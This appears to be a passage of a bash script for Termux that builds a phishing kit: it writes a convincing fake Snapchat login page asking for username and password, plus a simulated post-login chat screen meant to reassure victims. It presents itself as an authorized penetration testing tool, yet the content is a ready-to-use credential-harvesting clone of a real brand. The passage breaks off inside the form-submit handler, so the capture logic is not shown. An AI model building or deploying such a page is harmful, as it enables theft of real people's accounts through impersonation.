#!/data/data/com.termux/files/usr/bin/bash

# =============================================================================
# Snapchat Security Assessment Tool - Phishing Simulation
# Authorized Penetration Testing Tool
# For Termux Environment (Android)
# =============================================================================

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

BANNER="
${CYAN}
   ███████╗███╗   ██╗ █████╗ ██████╗ ██████╗██╗  ██╗ █████╗ ████████╗
   ██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔══██╗╚══██╔══╝
   ███████╗██╔██╗ ██║███████║██████╔╝██████╔╝███████║███████║   ██║   
   ╚════██║██║╚██╗██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══██║██╔══██║   ██║   
   ███████║██║ ╚████║██║  ██║██║     ██║     ██║  ██║██║  ██║   ██║   
   ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
${YELLOW}
   ╔══════════════════════════════════════════════════════════════╗
   ║       Snapchat Security Assessment - Phishing Simulation    ║
   ║             Authorized Penetration Testing Tool              ║
   ║                  For Termux (Android)                        ║
   ╚══════════════════════════════════════════════════════════════╝
${NC}
"

# Check if running in Termux
if [ ! -d "/data/data/com.termux" ]; then
    echo -e "${RED}[!] This script is designed for Termux on Android${NC}"
    exit 1
fi

echo -e "$BANNER"

CURRENT_DIR=$(pwd)
WORK_DIR="$CURRENT_DIR/snapchat_phish"
SERVER_PORT=8080

echo -e "${BLUE}[*] Installing required packages...${NC}"
pkg update -y 2>/dev/null
pkg install -y python php openssl 2>/dev/null || {
    echo -e "${YELLOW}[!] Some packages failed, continuing...${NC}"
}

mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

echo -e "${BLUE}[*] Creating Snapchat Security Assessment Page...${NC}"

# =============================================================================
# INDEX.HTML — Realistic Snapchat login page + simulated web interface
# =============================================================================
cat > "$WORK_DIR/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="theme-color" content="#FFFC00">
<title>Snapchat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:#111;min-height:100vh;display:flex;justify-content:center;align-items:center}
.container{width:100%;max-width:420px;background:#121212;border-radius:24px;overflow:hidden;position:relative;box-shadow:0 20px 60px rgba(0,0,0,0.8);transition:all 0.5s ease}

/* ===== LOGIN SCREEN ===== */
.login-screen{padding:60px 30px;text-align:center;min-height:550px;display:flex;flex-direction:column;align-items:center;justify-content:center}
.snap-icon{width:90px;height:90px;margin-bottom:25px}
.snap-icon svg{width:100%;height:100%}
.loading-text{color:#fff;font-size:24px;font-weight:700;margin-bottom:35px;letter-spacing:-0.5px}
.login-form{width:100%;max-width:340px;margin:0 auto}
.form-group{margin-bottom:14px;width:100%}
.form-group label{display:block;color:rgba(255,255,255,0.5);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;text-align:left}
.form-group input{width:100%;padding:14px 16px;background:#1E1E1E;border:2px solid transparent;border-radius:12px;color:#fff;font-size:15px;font-family:'Inter',sans-serif;transition:all 0.3s ease;outline:none}
.form-group input:focus{border-color:#FFFC00;background:#252525}
.form-group input::placeholder{color:rgba(255,255,255,0.3)}
.login-btn{width:100%;padding:15px;background:#FFFC00;color:#000;border:none;border-radius:12px;font-size:16px;font-weight:700;font-family:'Inter',sans-serif;cursor:pointer;transition:all 0.3s ease;margin-top:8px;letter-spacing:-0.3px}
.login-btn:hover{background:#E6E300;transform:translateY(-1px)}
.login-btn:active{transform:scale(0.98)}
.login-btn:disabled{opacity:0.6;cursor:not-allowed;transform:none}
.divider{display:flex;align-items:center;margin:20px 0;color:rgba(255,255,255,0.3);font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:rgba(255,255,255,0.1)}
.divider span{padding:0 15px}
.extra-links{text-align:center;margin-top:20px}
.extra-links a{color:rgba(255,255,255,0.5);text-decoration:none;font-size:13px;font-weight:500;margin:0 10px;transition:color 0.2s}
.extra-links a:hover{color:#FFFC00}
.signup-text{color:rgba(255,255,255,0.4);font-size:14px;margin-top:25px;text-align:center}
.signup-text a{color:#FFFC00;text-decoration:none;font-weight:600}
.error-msg{background:rgba(255,0,0,0.1);border:1px solid rgba(255,0,0,0.3);color:#ff4444;padding:10px 14px;border-radius:10px;font-size:13px;margin-bottom:14px;display:none;text-align:left}
.spinner{display:none;width:20px;height:20px;border:3px solid rgba(0,0,0,0.1);border-top:3px solid #000;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.btn-content{display:flex;align-items:center;justify-content:center;gap:10px}

/* ===== SIMULATED SNAPCHAT WEB INTERFACE ===== */
.snapchat-ui{display:none;width:100%;min-height:700px;background:#000;position:relative}

/* Top bar */
.sc-topbar{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:#0D0D0D;border-bottom:1px solid #1A1A1A;position:sticky;top:0;z-index:100}
.sc-topbar-left{display:flex;align-items:center;gap:12px}
.sc-avatar{width:36px;height:36px;border-radius:50%;background:#FFFC00;display:flex;align-items:center;justify-content:center;font-weight:700;color:#000;font-size:16px;cursor:pointer}
.sc-username{color:#fff;font-weight:600;font-size:15px}
.sc-topbar-right{display:flex;align-items:center;gap:18px}
.sc-icon{color:#fff;font-size:20px;cursor:pointer;opacity:0.8;transition:opacity 0.2s}
.sc-icon:hover{opacity:1}

/* Content area */
.sc-content{display:flex;flex-direction:column;height:calc(100% - 60px)}
.sc-chat-list{flex:1;overflow-y:auto;padding:8px 0}
.sc-chat-item{display:flex;align-items:center;gap:12px;padding:12px 16px;cursor:pointer;transition:background 0.2s;border-bottom:1px solid #111}
.sc-chat-item:hover{background:#0A0A0A}
.sc-chat-avatar{width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:600;color:#fff;font-size:18px;flex-shrink:0;position:relative}
.sc-chat-avatar .status-dot{position:absolute;bottom:2px;right:2px;width:10px;height:10px;border-radius:50%;border:2px solid #000}
.status-online{background:#44D7B6}
.status-offline{background:#555}
.sc-chat-info{flex:1;min-width:0}
.sc-chat-name{color:#fff;font-weight:600;font-size:15px;display:flex;align-items:center;gap:6px}
.sc-chat-name .verified{color:#FFFC00;font-size:12px}
.sc-chat-preview{color:rgba(255,255,255,0.4);font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
.sc-chat-time{color:rgba(255,255,255,0.3);font-size:11px;flex-shrink:0}
.sc-badge{background:#FFFC00;color:#000;border-radius:10px;padding:2px 7px;font-size:11px;font-weight:700;min-width:20px;text-align:center}

/* Bottom nav */
.sc-bottom-nav{display:flex;justify-content:space-around;align-items:center;padding:10px 0 16px 0;background:#0D0D0D;border-top:1px solid #1A1A1A;position:sticky;bottom:0}
.sc-nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;color:rgba(255,255,255,0.4);transition:color 0.2s;min-width:60px}
.sc-nav-item.active{color:#FFFC00}
.sc-nav-item svg{width:24px;height:24px}
.sc-nav-label{font-size:10px;font-weight:500}

/* Toast */
.toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%) translateY(100px);background:#FFFC00;color:#000;padding:12px 24px;border-radius:30px;font-weight:600;font-size:14px;opacity:0;transition:all 0.4s ease;z-index:999;pointer-events:none;white-space:nowrap}
.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}

/* Search bar */
.sc-search{padding:8px 16px;background:#0D0D0D}
.sc-search-input{width:100%;padding:10px 14px;background:#1A1A1A;border:1px solid #222;border-radius:10px;color:#fff;font-size:14px;font-family:'Inter',sans-serif;outline:none}
.sc-search-input::placeholder{color:rgba(255,255,255,0.3)}

/* Stories row */
.sc-stories{padding:12px 16px;border-bottom:1px solid #1A1A1A;background:#0D0D0D}
.sc-stories-title{color:rgba(255,255,255,0.5);font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:10px}
.sc-stories-row{display:flex;gap:14px;overflow-x:auto;padding-bottom:4px}
.sc-story-item{display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;flex-shrink:0}
.sc-story-ring{width:56px;height:56px;border-radius:50%;padding:3px;background:conic-gradient(#FFFC00,#FF6B00,#FFFC00);display:flex;align-items:center;justify-content:center}
.sc-story-ring-inner{width:100%;height:100%;border-radius:50%;background:#1A1A1A;display:flex;align-items:center;justify-content:center;overflow:hidden}
.sc-story-ring-inner img{width:100%;height:100%;object-fit:cover;border-radius:50%}
.sc-story-name{color:rgba(255,255,255,0.6);font-size:11px;max-width:60px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
</style>
</head>
<body>

<div class="container" id="app-container">

  <!-- ========== LOGIN SCREEN ========== -->
  <div class="login-screen" id="loginScreen">
    <div class="snap-icon">
      <svg viewBox="0 0 100 100" fill="none">
        <rect width="100" height="100" rx="22" fill="#FFFC00"/>
        <path d="M70 35C70 26.5 62 18 50 18C38 18 30 26.5 30 35V45C30 53.5 38 62 50 62C62 62 70 53.5 70 45V35Z" fill="#111"/>
        <path d="M32 65C30 70 33 76 38 78C43 80 49 82 50 82C51 82 57 80 62 78C67 76 70 70 68 65" stroke="#111" stroke-width="4" stroke-linecap="round"/>
        <circle cx="42" cy="40" r="4" fill="#FFFC00"/>
        <circle cx="58" cy="40" r="4" fill="#FFFC00"/>
      </svg>
    </div>
    <div class="loading-text">Snapchat</div>

    <form class="login-form" id="loginForm">
      <div class="error-msg" id="errorMsg"></div>
      <div class="form-group">
        <label for="username">Username or Email</label>
        <input type="text" id="username" name="username" placeholder="Enter your username" autocomplete="off" required>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="off" required>
      </div>
      <button type="submit" class="login-btn" id="loginBtn">
        <span class="btn-content">
          <span id="btnText">Log In</span>
          <div class="spinner" id="spinner"></div>
        </span>
      </button>
      <div class="divider"><span>OR</span></div>
      <button type="button" class="login-btn" style="background:#1E1E1E;color:#fff" onclick="document.getElementById('username').focus()">Use QR Code</button>
      <div class="extra-links">
        <a href="#">Forgot Password</a>
        <a href="#">Need Help?</a>
      </div>
      <div class="signup-text">New user? <a href="#">Sign Up</a></div>
    </form>
  </div>

  <!-- ========== SIMULATED SNAPCHAT WEB INTERFACE ========== -->
  <div class="snapchat-ui" id="snapchatUI">
    <!-- Top Bar -->
    <div class="sc-topbar">
      <div class="sc-topbar-left">
        <div class="sc-avatar" id="userAvatar">S</div>
        <span class="sc-username" id="displayUsername">snap_user</span>
      </div>
      <div class="sc-topbar-right">
        <span class="sc-icon">🔍</span>
        <span class="sc-icon">💬</span>
        <span class="sc-icon">⚡</span>
      </div>
    </div>

    <!-- Search -->
    <div class="sc-search">
      <input class="sc-search-input" type="text" placeholder="Search friends, groups..." id="searchInput">
    </div>

    <!-- Stories Row -->
    <div class="sc-stories">
      <div class="sc-stories-title">Stories</div>
      <div class="sc-stories-row" id="storiesRow">
        <div class="sc-story-item">
          <div class="sc-story-ring">
            <div class="sc-story-ring-inner" style="background:#FFFC00;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:700;color:#000">+</div>
          </div>
          <div class="sc-story-name">My Story</div>
        </div>
        <div class="sc-story-item">
          <div class="sc-story-ring"><div class="sc-story-ring-inner" style="background:linear-gradient(135deg,#833ab4,#fd1d1d)">👻</div></div>
          <div class="sc-story-name">alex_ray</div>
        </div>
        <div class="sc-story-item">
          <div class="sc-story-ring"><div class="sc-story-ring-inner" style="background:linear-gradient(135deg,#4CAF50,#8BC34A)">📸</div></div>
          <div class="sc-story-name">mike_snaps</div>
        </div>
        <div class="sc-story-item">
          <div class="sc-story-ring"><div class="sc-story-ring-inner" style="background:linear-gradient(135deg,#E91E63,#9C27B0)">✨</div></div>
          <div class="sc-story-name">jessica_xo</div>
        </div>
        <div class="sc-story-item">
          <div class="sc-story-ring"><div class="sc-story-ring-inner" style="background:linear-gradient(135deg,#00BCD4,#3F51B5)">🎵</div></div>
          <div class="sc-story-name">dj_sam</div>
        </div>
      </div>
    </div>

    <!-- Chat List -->
    <div class="sc-chat-list" id="chatList">
      <div class="sc-chat-item">
        <div class="sc-chat-avatar" style="background:linear-gradient(135deg,#667eea,#764ba2);">A<span class="status-dot status-online"></span></div>
        <div class="sc-chat-info">
          <div class="sc-chat-name">Alex Ray</div>
          <div class="sc-chat-preview">👋 Hey! You seen the game last night?</div>
        </div>
        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
          <div class="sc-chat-time">2m</div>
          <div class="sc-badge">3</div>
        </div>
      </div>
      <div class="sc-chat-item">
        <div class="sc-chat-avatar" style="background:linear-gradient(135deg,#f093fb,#f5576c);">M<span class="status-dot status-online"></span></div>
        <div class="sc-chat-info">
          <div class="sc-chat-name">Mike Snaps <span class="verified">✓</span></div>
          <div class="sc-chat-preview">📷 Snap me back when you get this!</div>
        </div>
        <div class="sc-chat-time">15m</div>
      </div>
      <div class="sc-chat-item">
        <div class="sc-chat-avatar" style="background:linear-gradient(135deg,#4facfe,#00f2fe);">J<span class="status-dot status-offline"></span></div>
        <div class="sc-chat-info">
          <div class="sc-chat-name">Jessica Chen</div>
          <div class="sc-chat-preview">Sent a Snap 🟡</div>
        </div>
        <div class="sc-chat-time">1h</div>
      </div>
      <div class="sc-chat-item">
        <div class="sc-chat-avatar" style="background:linear-gradient(135deg,#43e97b,#38f9d7);">S<span class="status-dot status-offline"></span></div>
        <div class="sc-chat-info">
          <div class="sc-chat-name">Sam Driver</div>
          <div class="sc-chat-preview">That party was wild 😂</div>
        </div>
        <div class="sc-chat-time">3h</div>
      </div>
      <div class="sc-chat-item">
        <div class="sc-chat-avatar" style="background:linear-gradient(135deg,#fa709a,#fee140);">T<span class="status-dot status-online"></span></div>
        <div class="sc-chat-info">
          <div class="sc-chat-name">Taylor Swift <span class="verified">✓</span></div>
          <div class="sc-chat-preview">💫 New era vibes ✨</div>
        </div>
        <div class="sc-chat-time">5h</div>
      </div>
      <div class="sc-chat-item">
        <div class="sc-chat-avatar" style="background:linear-gradient(135deg,#a18cd1,#fbc2eb);">R<span class="status-dot status-offline"></span></div>
        <div class="sc-chat-info">
          <div class="sc-chat-name">Rachel Green</div>
          <div class="sc-chat-preview">Coffee tomorrow? ☕</div>
        </div>
        <div class="sc-chat-time">6h</div>
      </div>
      <div class="sc-chat-item">
        <div class="sc-chat-avatar" style="background:linear-gradient(135deg,#ffecd2,#fcb69f);">D<span class="status-dot status-online"></span></div>
        <div class="sc-chat-info">
          <div class="sc-chat-name">David Park</div>
          <div class="sc-chat-preview">🔥 Check out this streak!</div>
        </div>
        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
          <div class="sc-chat-time">8h</div>
          <div class="sc-badge">🔥 127</div>
        </div>
      </div>
      <div class="sc-chat-item">
        <div class="sc-chat-avatar" style="background:linear-gradient(135deg,#89f7fe,#66a6ff);">E<span class="status-dot status-offline"></span></div>
        <div class="sc-chat-info">
          <div class="sc-chat-name">Emma Wilson</div>
          <div class="sc-chat-preview">📸 New post on Spotlight!</div>
        </div>
        <div class="sc-chat-time">12h</div>
      </div>
    </div>

    <!-- Bottom Nav -->
    <div class="sc-bottom-nav">
      <div class="sc-nav-item active">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 3h7v7H3V3zm11 0h7v7h-7V3zM3 14h7v7H3v-7zm11 0h7v7h-7v-7z"/></svg>
        <span class="sc-nav-label">Chat</span>
      </div>
      <div class="sc-nav-item">
        <svg viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="3"/><path d="M20 4h-3.17l-1.24-1.35A2 2 0 0013.88 2h-3.76c-.66 0-1.3.26-1.71.65L7.17 4H4a2 2 0 00-2 2v12a2 2 0 002 2h16a2 2 0 002-2V6a2 2 0 00-2-2zM12 17a5 5 0 110-10 5 5 0 010 10z"/></svg>
        <span class="sc-nav-label">Camera</span>
      </div>
      <div class="sc-nav-item">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        <span class="sc-nav-label">Spotlight</span>
      </div>
      <div class="sc-nav-item">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
        <span class="sc-nav-label">Map</span>
      </div>
      <div class="sc-nav-item">
        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
        <span class="sc-nav-label">Stories</span>
      </div>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
const form = document.getElementById('loginForm');
const loginBtn = document.getElementById('loginBtn');
const btnText = document.getElementById('btnText');
const spinner = document.getElementById('spinner');
const errorMsg = document.getElementById('errorMsg');
const loginScreen = document.getElementById('loginScreen');
const snapchatUI = document.getElementById('snapchatUI');
const displayUsername = document.getElementById('displayUsername');
const userAvatar = document.getElementById('userAvatar');
const toast = document.getElementById('toast');
const container = document.getElementById('app-container');

function showToast(msg) {
  toast.textContent = msg;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 3000);
}

form.addEventListener('submit', function(e) {
  e.preventDefault();
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();

  if (!username || !password) {
    errorMsg.textContent = 'Please fill in all fields.';
    errorMsg.style.display = 'block';
    return;